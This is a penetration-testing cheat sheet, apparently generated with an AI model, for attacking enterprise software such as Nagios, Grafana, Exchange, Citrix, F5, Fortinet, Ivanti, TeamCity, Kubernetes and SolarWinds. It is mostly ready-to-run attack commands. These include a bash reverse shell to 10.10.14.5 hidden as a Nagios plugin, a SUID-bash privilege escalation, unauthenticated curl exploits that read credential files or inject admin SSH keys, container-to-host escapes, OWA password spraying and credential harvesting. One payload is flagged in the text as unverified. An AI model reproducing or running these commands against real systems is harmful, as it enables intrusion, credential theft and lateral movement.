### Enumeration Tools

| Tool | Purpose |
|---|---|
| CFF Explorer | PE header analysis, imports, resources |
| Detect It Easy (DIE) | Language/packer/compiler fingerprinting |
| Process Monitor (Procmon) | File, registry, network activity |
| Strings (Sysinternals) | Extract strings from binary |
| TCPView | Active network connections per process |
| Wireshark / tcpdump | Traffic capture |
| Burp Suite | HTTP/HTTPS proxy (set system proxy) |

### Attack Tools

| Tool | Purpose |
|---|---|
| x64dbg | Dynamic analysis, memory dump, patching |
| dnSpy | .NET decompile and debug |
| JADX / JD-GUI | Java decompile |
| Ghidra / IDA / Radare2 | Static reverse engineering |
| OllyDbg | x86 dynamic analysis (older) |
| Frida | Dynamic instrumentation (hook functions at runtime) |

### Methodology

```text
1. Fingerprint → DIE to identify language/framework
2. Static → strings, decompile (.NET: dnSpy, Java: JADX/JD-GUI, native: Ghidra)
3. Dynamic → Procmon during login/action → find config files, reg keys, temp files
4. Traffic → Wireshark/Burp → look for unencrypted comms, weak TLS, injectable params
5. Memory → x64dbg → dump memory → strings → credentials, keys
6. Credentials → check config files, registry, install dir for hardcoded creds
```

```bash
# Frida — hook function and print args (example)
frida -l hook.js -f target.exe      # spawned process resumes automatically; add --pause to keep it suspended
# (--no-pause was removed from frida-tools — old blog posts still show it and it now errors)

# Strings — .NET string literals are UTF-16LE, so plain `strings` misses them; run both
strings target.exe | grep -i "pass\|key\|secret\|connect"
strings -el target.exe | grep -i "pass\|key\|secret\|connect"
```

> [!tip] dnSpy is archived — use the maintained fork **dnSpyEx** (or ILSpy). Run `de4dot` first on obfuscated .NET assemblies. For the full thick-client workflow see [[Methdocs/Claude/THICK-00-Overview|THICK methodology]].

---

## Other Notable Apps

| Application | Default Creds | Key Attack Path |
|---|---|---|
| **Axis2** | `admin:axis2` | Upload malicious AAR service file → RCE (similar to Tomcat WAR) |
| **WebSphere** | `system:manager` | WAR deployment via admin console → RCE |
| **WebLogic** | `weblogic:weblogic1` | Java deserialization (190+ CVEs) — check version |
| **Nagios** | `nagiosadmin:PASSW0RD` | Authenticated RCE via command injection, privesc to root |
| **Zabbix** | `Admin:zabbix` | Built-in script execution → RCE; API accessible at `/api_jsonrpc.php` |
| **Elasticsearch** | none (older) | Unauthenticated data access; check for Groovy/Painless script injection |
| **DotNetNuke (DNN)** | none — set at install | Auth bypass, file upload bypass, directory traversal CVEs |
| **vCenter** | none — `administrator@vsphere.local` is the SSO admin *username*, password set at install | CVE-2021-21972 (unauth vROps-plugin OVA upload → RCE), CVE-2021-22005 (analytics-service file upload → RCE); Windows vCenter shells can run as SYSTEM |
| **phpMyAdmin** | `root:` (no pass) | SQL → write webshell via `SELECT INTO OUTFILE` |
| **Confluence** | none — set at install | CVE-2022-26134 (unauth OGNL injection → RCE) — see [[#Atlassian Confluence]] |
| **MediaWiki** | none — set at install | Template injection, file upload, check for `LocalSettings.php` creds |

---

## Nagios

### Overview

Two flavors — **Nagios Core** (open source) and **Nagios XI** (commercial). XI is far more common on enterprise engagements and has a much larger attack surface. Nagios typically runs as the `nagios` user and monitors every host on the network — config files often contain SSH keys, SNMP strings, and WMI credentials for every monitored device.

### Enumeration

```bash
# Default ports: 80, 443
# Core path:  /nagios/
# XI path:    /nagiosxi/

curl -sk http://target.com/nagiosxi/ | grep -i "nagios\|version"
curl -sk http://target.com/nagios/  # Core

# Version — XI footer or about page
curl -sk http://target.com/nagiosxi/about.php | grep -i version

# Nmap
nmap -sV -p 80,443 --script=http-title target.com
```

**Default credentials:**
- Nagios XI: `nagiosadmin:nagiosadmin` or `nagiosadmin:PASSW0RD`
- Nagios Core: `nagiosadmin:nagiosadmin`

### Attacking

**CVE-2021-25296 / 25297 / 25298 — Authenticated OS command injection (Nagios XI ≤ 5.7.5):**

```bash
# Injection points in the config wizards (Windows WMI, Switch, Cloud VM). Find the module/PoC by CVE:
msfconsole -q -x 'search cve:2021-25296'
searchsploit nagios xi 5.7
```

**CVE-2019-15949 — Authenticated RCE as root (Nagios XI < 5.6.6):**

```bash
# Admin uploads a "plugin" that replaces a root-executed check (e.g. check_ping) → code runs as root
msfconsole -q -x 'search cve:2019-15949'
```

**CVE-2023-40931 / 40932 / 40933 / 40934 — SQLi (Nagios XI < 5.11.2):**

```bash
# Needs a valid session (any user level). CVE-2023-40931 = id param of the banner-acknowledge endpoint (POST)
sqlmap -u 'http://target.com/nagiosxi/admin/banner_message-ajaxhelper.php' \
  --data 'action=acknowledge_banner_message&id=1' -p id \
  --cookie '<session cookie from Burp>' --batch --dbs
```

**Post-auth RCE via plugin upload (any version with admin access):**

```bash
# Nagios XI Admin → System Extensions → Manage Plugins → Upload Plugin
# Upload a "plugin" that is actually a reverse shell script
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/9001 0>&1
EOF
# Upload shell.sh as a plugin, then trigger it via a check command
# Admin → Core Config Manager → Commands → Add new command
# command_line: /usr/local/nagios/libexec/shell.sh
```

**Privilege escalation — nagios → root:**

```bash
# Check sudo rules — very common misconfiguration
sudo -l
# Common findings:
# (root) NOPASSWD: /usr/local/nagiosxi/scripts/
# (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/cron/

# If nagios user can write plugin dir and sudo execute:
echo 'chmod +s /bin/bash' > /usr/local/nagios/libexec/evil.sh
chmod +x /usr/local/nagios/libexec/evil.sh
sudo /usr/local/nagios/libexec/evil.sh
/bin/bash -p
```

### Post-Compromise — Credential Harvesting

```bash
# Nagios Core config — host/service check credentials
cat /usr/local/nagios/etc/resource.cfg          # $USER1$..$USERn$ macros — check passwords live here
cat /usr/local/nagios/etc/htpasswd.users        # web UI hashes (crack offline)
grep -r "password\|community\|ssh" /usr/local/nagios/etc/
# Distro packages use /etc/nagios4/ (Debian/Ubuntu) or /etc/nagios/ instead

# Nagios XI DB creds — $cfg['db_info'] array
grep -A8 "db_info" /usr/local/nagiosxi/html/config.inc.php

# SNMP community strings for monitored devices
grep -r "community" /usr/local/nagios/etc/

# SSH keys used for agentless monitoring
ls -la /home/nagios/.ssh/
cat /home/nagios/.ssh/id_rsa
```

> [!note]
> Nagios is a lateral movement goldmine. The monitoring account often has SSH access (sometimes key-based, no password) to every Linux host it monitors. Dumping `/usr/local/nagios/etc/` and the XI database frequently yields credentials for a significant portion of the environment.

---

## Grafana

### Enumeration

```bash
# Default port: 3000. Login page reveals version bottom-right, or via the API:
curl -s http://target:3000/api/health           # {"version":"8.3.0", ...} — no auth
curl -s http://target:3000/login | grep -oiE 'grafana[^"]{0,20}'
# Default creds worth a try: admin:admin (forces a change on first login)
```

### Attacking

```bash
# CVE-2021-43798 — UNAUTH directory traversal / arbitrary file read (8.0.0-beta1 → 8.3.0).
# Traverse out of any INSTALLED plugin's static dir. Plugin ids that ship by default:
#   alertlist, graph, table, text, stat, gauge, piechart, ...
curl -s --path-as-is \
  "http://target:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"

# The two files worth reading first:
#   /etc/grafana/grafana.ini    → admin_password, secret_key, SMTP/LDAP creds
#   /var/lib/grafana/grafana.db → SQLite: user table (hashes) + data-source creds
curl -s --path-as-is "http://target:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini"
curl -s --path-as-is "http://target:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
```

> [!tip] `grafana.db` data-source passwords are AES-encrypted with the `secret_key` from `grafana.ini` — grab **both** files, then decrypt offline (grafana's `securejsondata`/`secureJsonData` fields). The `--path-as-is` curl flag is essential: without it curl collapses the `../` client-side and the traversal never reaches the server. Post-auth (or with cracked creds), Grafana data sources can also reach internal services (SSRF) and some support query-based file/command primitives.

---

## Exchange / OWA

### Enumeration

```bash
# Discover Exchange
nmap -p 25,443,587 --script=banner target.com
curl -sk https://target.com/owa/ -I | grep -i "x-owa\|x-ms-diagnostics\|Location"

# Common paths
/owa/                         # Outlook Web Access login
/autodiscover/autodiscover.xml
/ews/exchange.asmx            # Exchange Web Services
/mapi/                        # MAPI over HTTP (Outlook modern auth)
/rpc/                         # RPC over HTTP (older Outlook)
/ecp/                         # Exchange Control Panel (admin)

# Version fingerprint via OWA
curl -sk https://target.com/owa/ | grep -i "version\|14\.\|15\."
# 14.x = Exchange 2010, 15.0 = 2013, 15.1 = 2016, 15.2 = 2019

# Internal AD domain / hostname leak from the NTLM challenge
nmap -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ target.com
```

### Password Spray

```bash
# MailSniper — OWA spray (PowerShell)
Invoke-PasswordSprayOWA -ExchHostname target.com -UserList users.txt -Password 'Spring2024!'

# ruler — spray via Autodiscover
ruler --domain target.com brute --users users.txt --passwords passwords.txt --delay 0 --verbose
```

### CVE-Based Attacks

```bash
# Map the OWA build number to the CU/patch level first, then find modules by CVE:
# ProxyLogon (CVE-2021-26855 + CVE-2021-27065) — Exchange 2013-2019, unauth RCE
# SSRF → auth bypass → arbitrary file write → webshell
msfconsole -q -x 'search cve:2021-26855'

# ProxyShell (CVE-2021-34473/34523/31207) — unauth RCE via autodiscover
msfconsole -q -x 'search cve:2021-34473'

# ProxyNotShell (CVE-2022-41040 SSRF + CVE-2022-41082 RCE) — needs valid creds; use after spray
msfconsole -q -x 'search cve:2022-41082'
```

> [!note]
> After gaining access via OWA, MailSniper can dump the global address list (all email addresses), search mailboxes for keywords (password, vpn, secret), and enumerate mail forwarding rules — all useful for lateral movement and data collection.

---

## Citrix NetScaler / ADC

### Enumeration

```bash
# Default ports: 80, 443, 8080, 8443
# Admin console: https://target.com/nitro/v1/ (REST API)
# Login page: /logon/LogonPoint/index.html (StoreFront)

curl -sk https://target.com/vpn/index.html | grep -i "citrix\|netscaler\|version"
nmap -sV -p 443,8443 --script=http-title target.com
```

### Attacking

```bash
# CVE-2023-3519 — Unauthenticated RCE, stack overflow (NetScaler ADC/Gateway 13.1 < 13.1-49.13,
# 13.0 < 13.0-91.13). Requires the appliance to be configured as a Gateway or AAA virtual server.
# Sink: /gwtest/formssso
msfconsole -q -x 'search cve:2023-3519'
# Mandiant's repo for this CVE is an IOC *scanner* (post-compromise check), not an exploit.

# CVE-2023-24488 — reflected XSS (lower severity; separate version range — check the advisory)

# Citrix Bleed (CVE-2023-4966) — unauth memory over-read leaking session tokens → session hijack
msfconsole -q -x 'search cve:2023-4966'
# Use leaked token in cookie: NSC_AAAC=<token>

# Citrix Bleed 2 (CVE-2025-5777) — same class (pre-auth memory over-read) disclosed June 2025;
# check the Citrix bulletin for affected builds

# Default credentials
# nsroot:nsroot (CLI via SSH port 22)
ssh nsroot@target.com   # if SSH exposed
```

> [!note]
> Citrix Bleed (CVE-2023-4966) was heavily exploited in late 2023 against healthcare, finance, and government targets. If you see a NetScaler/Gateway on an engagement and it's unpatched, this is your entry point — no credentials needed.

---

## F5 BIG-IP

### Enumeration

```bash
# Management console: https://target.com:8443/tmui/login.jsp (TMUI)
# Also: https://target.com/tmui/
# Default creds: admin:admin

curl -sk https://target.com:8443/tmui/login.jsp | grep -i "big-ip\|version"
nmap -sV -p 443,8443,22 target.com
```

### Attacking

```bash
# CVE-2022-1388 — Unauthenticated RCE via iControl REST API (BIG-IP 16.1.x < 16.1.2.2, etc.)
# ⚠ UNVERIFIED payload (2026-10-07 audit could not source-check it) — test in a lab first, or use the module below
curl -sk -X POST https://target.com/mgmt/tm/util/bash -H "Content-Type: application/json" -H "Authorization: Basic YWRtaW46" -H "X-F5-Auth-Token: a" -H "Connection: keep-alive, X-F5-Auth-Token" -d '{"command":"run","utilCmdArgs":"-c id"}'

# Module alt: msfconsole -q -x 'search cve:2022-1388'

# CVE-2020-5902 — Path traversal → RCE via TMUI (BIG-IP < 15.1.0.4)
curl -sk 'https://target.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'

# Post-auth persistence
# TMUI → iRules → create malicious iRule executed on traffic
# Or: tmsh modify auth user admin password newpass
```

---

## Ivanti / Pulse Secure

### Enumeration

```bash
# Pulse Connect Secure VPN — usually port 443
# Login: https://target.com/dana-na/auth/url_default/welcome.cgi
curl -sk https://target.com/ | grep -i "pulse\|ivanti\|juniper"
```

### CVEs

```bash
# CVE-2019-11510 — Unauthenticated arbitrary file read (Pulse Secure < 8.1R15.1/8.3R7.1/9.0R3.4)
curl -sk 'https://target.com/dana-na/../dana/html5acc/guacamole/../../../tmp/system.log?/dana/html5acc/guacamole/'
curl -sk 'https://target.com/dana-na/../dana/html5acc/guacamole/../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/' > creds.mdb
# Parse data.mdb for plaintext credentials

# CVE-2021-22893 — Auth bypass → RCE, unauthenticated (Pulse Connect Secure 9.0R3+ / 9.1 < 9.1R11.4)

# CVE-2023-46805 + CVE-2024-21887 — Auth bypass + command injection (Ivanti Connect/Policy Secure 9.x, 22.x)
# The auth bypass is a ../ traversal from an unauthenticated API path into a protected one; the
# command injection rides in the URL PATH of that protected endpoint (not in a header).
msfconsole -q -x 'search cve:2024-21887'

# CVE-2025-0282 — pre-auth stack overflow RCE in Ivanti Connect Secure (exploited Jan 2025);
# check the Ivanti advisory for fixed builds

# Ivanti Sentry (ex-MobileIron Sentry) — CVE-2023-38035
# Auth bypass on the System Manager Portal / MICS admin API (port 8443) → OS command execution as root
```

> [!note]
> CVE-2019-11510 yielded plaintext AD credentials in many real-world breaches. Even if patched, check the logs — session tokens and credential files may have been exfiltrated before patching and could still be valid.

---

## Palo Alto GlobalProtect

### Enumeration

```bash
# Default ports: 443 (GlobalProtect portal/gateway), 4443
curl -sk https://target.com/global-protect/login.esp | grep -i "palo\|pan-os\|version"
curl -sk https://target.com/php/login.php -I

# Interesting paths
/global-protect/login.esp     # GP portal login
/ssl-vpn/login.html           # alternate path
/api/                         # PAN-OS XML API
```

### CVEs

```bash
# CVE-2024-3400 — Unauthenticated OS command injection via GlobalProtect
# Affected: PAN-OS 10.2 < 10.2.9-h1, 11.0 < 11.0.4-h1, 11.1 < 11.1.2-h3 with a GP gateway or portal enabled
# Mechanism: the SESSID cookie on /ssl-vpn/hipreport.esp is used as a FILE NAME without sanitising
# → path traversal file-create; a file name containing shell syntax is later executed by a root
# process. The injection is in the cookie, not the POST body.
msfconsole -q -x 'search cve:2024-3400'

# CVE-2019-1579 — Pre-auth RCE (GlobalProtect < 7.1.19/8.0.12/8.1.3)

# CVE-2024-0012 + CVE-2024-9474 — management-web-interface auth bypass + privesc to root
# (only if the PAN-OS management UI is reachable — it shouldn't be from outside)
```

---

## Fortinet

### Enumeration

```bash
# FortiGate web admin: https://target.com:443 or :8443
# SSL-VPN portal: https://target.com/remote/login
curl -sk https://target.com/remote/login | grep -i "fortinet\|fortigate\|version"
```

### CVEs

```bash
# CVE-2022-40684 — Auth bypass on the admin interface (FG-IR-22-377)
# Affected: FortiOS 7.0.0–7.0.6, 7.2.0–7.2.1 · FortiProxy 7.0.0–7.0.6, 7.2.0 · FortiSwitchManager 7.0.0, 7.2.0
# Writes an SSH key to the admin user without authentication
curl -sk -X PUT 'https://target.com/api/v2/cmdb/system/admin/admin' -H 'User-Agent: Report Runner' -H 'Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";' -d '{"ssh-public-key1":"ssh-rsa AAAA..."}'

# CVE-2023-27997 "XORtigate" — Heap overflow RCE in SSL-VPN, pre-auth (FG-IR-23-097)
# Affected FortiOS: 6.0.0–6.0.16, 6.2.0–6.2.13, 6.4.0–6.4.12, 7.0.0–7.0.11, 7.2.0–7.2.4 (7.4 not affected)

# CVE-2024-21762 — Out-of-bounds write in SSL-VPN, unauthenticated RCE (FG-IR-24-015)
# Affected FortiOS: 6.0.0–6.0.17, 6.2.0–6.2.15, 6.4.0–6.4.14, 7.0.0–7.0.13, 7.2.0–7.2.6, 7.4.0–7.4.2

# CVE-2018-13379 — SSL-VPN path traversal → plaintext credentials in session files (FG-IR-18-384)
# Affected FortiOS: 5.4.6–5.4.12, 5.6.3–5.6.7, 6.0.0–6.0.4 — only with SSL-VPN enabled
curl -sk 'https://target.com/remote/fgt_lang?lang=/../../../..//dev/cmdb/sslvpn_websession'
```

---

## ManageEngine

### Overview

ManageEngine makes 30+ products — all historically vulnerable. Common on enterprise engagements.

| Product | Default Port | Purpose |
|---|---|---|
| ServiceDesk Plus | 8080/8443 | ITSM ticketing |
| ADManager Plus | 8080 | AD management |
| ADSelfService Plus | 9251 | Self-service password reset |
| Endpoint Central (formerly Desktop Central) | 8020/8383 | Endpoint management / patching / MDM |
| OpManager | 8060 (or 80/443) | Network monitoring |

### Enumeration

```bash
# Default creds (most products): admin:admin  or  admin:admin123
curl -sk http://target.com:8080/ | grep -i "manageengine\|servicedesk\|version"

# ServiceDesk Plus
/sdpapi/           # REST API
/Login.do          # Login page
```

### Attacking

```bash
# CVE-2022-47966 — Unauthenticated RCE via SAML (vulnerable bundled Apache Santuario)
# Affects 20+ ME products incl. ServiceDesk Plus, ADSelfService Plus, Endpoint Central.
# Most need SAML SSO enabled (now or ever); ServiceDesk Plus is exploitable regardless.
msfconsole -q -x 'search cve:2022-47966'      # separate modules per product

# CVE-2021-44515 — Auth bypass → RCE (Desktop Central, Windows; exploited Dec 2021)
# No Metasploit module — searchsploit / GitHub by CVE

# CVE-2021-40539 — REST API auth bypass → pre-auth RCE (ADSelfService Plus ≤ 6113)
msfconsole -q -x 'search cve:2021-40539'

# Post-auth: ServiceDesk Plus custom triggers / custom-action scripts run on the server —
# admin access usually equals code execution
```

> [!note]
> ADSelfService Plus is especially valuable — it handles password resets for AD accounts and often stores or can be abused to reset domain user credentials. Compromise of this service can equal AD access without touching a DC.

---

## TeamCity / JetBrains

### Enumeration

```bash
# Default port: 8111
# No default creds — the first-run wizard creates the admin account
curl -s http://target.com:8111/ | grep -i "teamcity\|version"

# REST API
curl -s http://target.com:8111/app/rest/server   # version info (may require auth)
```

### Attacking

```bash
# CVE-2024-27198 — Auth bypass → admin (TeamCity < 2023.11.4)
# Alternative-path bypass: a request for a nonexistent path whose `jsp` parameter ends in ";.jsp"
# is routed to the target REST endpoint without auth → create an admin user or token.
msfconsole -q -x 'search cve:2024-27198'

# CVE-2023-42793 — Auth bypass → admin token (TeamCity < 2023.05.4)
msfconsole -q -x 'search cve:2023-42793'

# Post-auth RCE — Build configuration → Build Steps → add a "Command Line" step → Run
# (runs on the build agent as the agent's service account)

# Token-based auth — check for build agent tokens in config files
# Tokens allow triggering builds → RCE via build steps

# Post-shell on the server: the super-user token is written to the log on every start
grep -i "super user authentication token" <TeamCity_dir>/logs/teamcity-server.log
# log in with an empty username and the token as the password
```

> [!note]
> TeamCity often has access to source code, SSH keys, and deployment credentials stored as build parameters. After gaining access, enumerate all projects and build configs for secrets before going for shells.

---

## Kubernetes / Docker

### Docker

```bash
# Exposed Docker API — default port 2375 (unauthenticated), 2376 (TLS)
curl http://target.com:2375/v1.41/info
curl http://target.com:2375/v1.41/containers/json

# Escape via privileged container / docker socket
# If you have access to /var/run/docker.sock inside a container:
docker -H unix:///var/run/docker.sock run -it --rm --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh

# Mount host root filesystem
docker -H unix:///var/run/docker.sock run -it --rm -v /:/host alpine chroot /host sh

# From outside — RCE via exposed API
docker -H tcp://target.com:2375 run -it --rm -v /:/host alpine chroot /host sh
```

### Kubernetes

```bash
# Check for exposed API server (default: 6443, 8080 unauthenticated)
curl -sk https://target.com:6443/api/v1/namespaces
curl http://target.com:8080/api/v1/pods   # unauthenticated port (legacy)

# kubectl with stolen token
kubectl --server=https://target.com:6443 --token=<token> --insecure-skip-tls-verify get pods -A

# Enumerate permissions
kubectl auth can-i --list

# Dashboard — exposed without auth
# https://target.com/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/

# Node takeover — if your token can create pods, schedule one that mounts the node's root FS
# (hostPath + chroot needs no privileged flag; nsenter into PID 1 would also need privileged: true)
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  containers:
  - name: escape
    image: alpine
    command: ["sleep","infinity"]
    volumeMounts:
    - mountPath: /host
      name: host-vol
  volumes:
  - name: host-vol
    hostPath:
      path: /
EOF
kubectl exec -it escape -- chroot /host /bin/bash     # shell on the node's filesystem

# Kubelet API (10250) — anonymous auth is sometimes left on
curl -sk https://<node>:10250/pods          # pod list = auth not enforced
curl -sk https://<node>:10250/runningpods/
# kubeletctl (https://github.com/cyberark/kubeletctl) automates enum + exec through the kubelet
```

> [!note] Escaping *from inside* a container (privileged flag, mounted docker.sock, dangerous capabilities) is covered step by step in [[Techniques/Container Escape|Container Escape]].

> [!note]
> Service account tokens are often mounted automatically in pods at `/var/run/secrets/kubernetes.io/serviceaccount/token`. If you land in a container, always check this first — the token may have `cluster-admin` privileges.

---

## Zimbra

### Enumeration

```bash
# Default ports: 80, 443, 7071 (admin console), 7072 (LDAP proxy)
curl -sk https://target.com/ | grep -i "zimbra\|version"
curl -sk https://target.com/zimbra/   # webmail login
# Admin console: https://target.com:7071/zimbraAdmin/
```

### Attacking

```bash
# CVE-2022-27925 + CVE-2022-37042 — mboximport ZIP-slip file write; 37042 is the auth bypass
# that makes it unauthenticated (8.8.15 / 9.0.0, patched 2022 — check the patch level)
msfconsole -q -x 'search cve:2022-27925'

# CVE-2022-41352 — Unauthenticated RCE: amavis extracts an emailed archive with cpio,
# which follows the path traversal → webshell in the web root
msfconsole -q -x 'search cve:2022-41352'

# CVE-2023-37580 — Reflected XSS → session steal (Zimbra < 8.8.15.p41)

# Admin console login check with recovered/sprayed creds (no shipped default password)
curl -sk -X POST 'https://target.com:7071/service/admin/soap' -d '<AuthRequest xmlns="urn:zimbraAdmin"><name>admin@target.com</name><password><pass></password></AuthRequest>'

# Post-auth webshell path
# Zimbra webroot: /opt/zimbra/jetty/webapps/zimbra/

# Post-shell: dump LDAP/MySQL/admin secrets from local config (run as the zimbra user)
su - zimbra -c 'zmlocalconfig -s' | grep -i pass
```

---

## SolarWinds Orion

### Enumeration

```bash
# Default port: 8787 (HTTP), 443 (HTTPS)
# Login: https://target.com:8787/Orion/Login.aspx
curl -sk https://target.com:8787/ | grep -i "solarwinds\|orion"

# Default creds: Admin with a blank password (older installs) — always try it
```

### Attacking

```bash
# CVE-2020-10148 — API auth bypass (Orion Platform < 2020.2.1 HF2 / 2019.4 HF6)
# Requests whose PathInfo contains WebResource.axd, ScriptResource.axd, i18n.ashx or Skipi18n
# skip the auth check (the bug SUPERNOVA used). No Metasploit module — searchsploit / GitHub by CVE.

# Post-auth RCE — Alerts → Manage Alerts → add a trigger action "Execute an external program"
# (runs on the Orion server as its service account)

# Orion API (SWIS, port 17778) — enumerate everything Orion monitors
curl -sk -X POST 'https://target.com:17778/SolarWinds/InformationService/v3/Json/Query' \
  -u 'admin:<pass>' -H 'Content-Type: application/json' -d '{"query":"SELECT Caption, IPAddress FROM Orion.Nodes"}'

# SUNBURST/SUNSPOT context — if you find Orion, assume it has broad network visibility
# Check connected agents — Orion has WMI/SNMP/SSH access to monitored hosts
```

> [!note]
> SolarWinds Orion typically has monitoring credentials (SNMP community strings, WMI credentials, SSH keys) stored for every device it monitors. Compromising Orion = read access to large portions of the network.

---

## Quick Reference

| App | Goal | Command |
|---|---|---|
| WordPress | Full enum | `wpscan --url http://target.com --enumerate u,ap,at,tt,cb,dbe` |
| WordPress | User enum (unauth) | `curl http://target.com/wp-json/wp/v2/users` |
| Joomla | Version | `curl -s http://target.com/administrator/manifests/files/joomla.xml \| grep '<version>'` |
| Joomla | Scan | `droopescan scan joomla --url http://target.com/` |
| Drupal | Version | `curl -s http://target.com/CHANGELOG.txt \| head -5` |
| Drupal | Drupalgeddon2 | `python3 drupalgeddon2.py http://target.com` |
| Tomcat | Brute manager creds | `msf: auxiliary/scanner/http/tomcat_mgr_login` |
| Tomcat | WAR deploy (curl) | `curl -u tomcat:tomcat "http://target:8080/manager/text/deploy?path=/shell&update=true" --upload-file shell.war` |
| Tomcat | Ghostcat LFI | `python2.7 tomcat-ajp.lfi.py target.com -p 8009 -f WEB-INF/web.xml` |
| Tomcat | Unauth RCE (2025) | CVE-2025-24813 partial-PUT session deserialization (KEV) |
| Jenkins | RCE | `/script` Groovy Script Console |
| Jenkins | File read CVE | CVE-2024-23897 (CLI parser arbitrary file read) |
| Jenkins | Git Parameter injection | CVE-2025-53652 (`buildWithParameters` unsanitized value) |
| Splunk | REST API check | `curl -k https://target.com:8089/services/server/info` |
| Splunk | RCE via app upload | Manage Apps → Install app from file (reverse shell app) |
| PRTG | Command injection | CVE-2018-9276 via Notifications → execute program |
| GitLab | Unauth RCE | CVE-2021-22205 (ExifTool image parsing, < 13.10.3) |
| Nagios XI | Auth'd command injection | CVE-2021-25296/25297/25298 |
| Nagios XI | SQLi (any logged-in user) | CVE-2023-40931 — `sqlmap` POST `id` on `banner_message-ajaxhelper.php` with session cookie |
| Cacti | Unauth RCE | CVE-2022-46169 (≤ 1.2.22) — `exploit/linux/http/cacti_unauthenticated_cmd_injection` |
| Jenkins | Decrypt stored creds | Script Console: `println(hudson.util.Secret.decrypt("{AQAA...}"))` |
| Exchange/OWA | Password spray | `Invoke-PasswordSprayOWA -ExchHostname target.com -UserList users.txt -Password 'X'` |
| Exchange/OWA | Unauth RCE | ProxyLogon (CVE-2021-26855+27065) / ProxyShell (CVE-2021-34473) |
| Citrix NetScaler | Unauth RCE | CVE-2023-3519 (< 13.1-49.13) |
| Citrix NetScaler | Session hijack | Citrix Bleed CVE-2023-4966 |
| F5 BIG-IP | Unauth RCE | CVE-2022-1388 via iControl REST `/mgmt/tm/util/bash` |
| Ivanti/Pulse | File read | CVE-2019-11510 (< 8.1R15.1) |
| Palo Alto GlobalProtect | Unauth RCE | CVE-2024-3400 (PAN-OS 10.2/11.0/11.1 with GP enabled — injection via `SESSID` cookie) |
| Fortinet | Auth bypass | CVE-2022-40684 (add admin SSH key) |
| ManageEngine | Unauth RCE (SAML) | CVE-2022-47966 |
| TeamCity | Auth bypass → admin | CVE-2024-27198 |
| Docker API | RCE (exposed 2375) | `docker -H tcp://target:2375 run -it --rm -v /:/host alpine chroot /host sh` |
| Kubernetes | Enum with stolen token | `kubectl --server=https://target:6443 --token=<t> --insecure-skip-tls-verify get pods -A` |
| Zimbra | Unauth RCE | CVE-2022-41352 (cpio extract, < 9.0.0.p29) |
| SolarWinds Orion | Auth bypass | CVE-2020-10148 (PathInfo `WebResource.axd`/`Skipi18n` trick, < 2020.2.1 HF2) |
| Kubernetes | Kubelet anon check | `curl -sk https://<node>:10250/pods` |
| CGI/Shellshock | Test | `curl -H "User-Agent: () { :; }; echo vulnerable" http://target.com/cgi-bin/status` |
| ColdFusion | Path traversal → creds | CVE-2010-2861 (`password.properties` disclosure) |

---

*Created: 2026-03-20*
*Updated: 2026-10-07*
*Model: claude-opus-5-5*
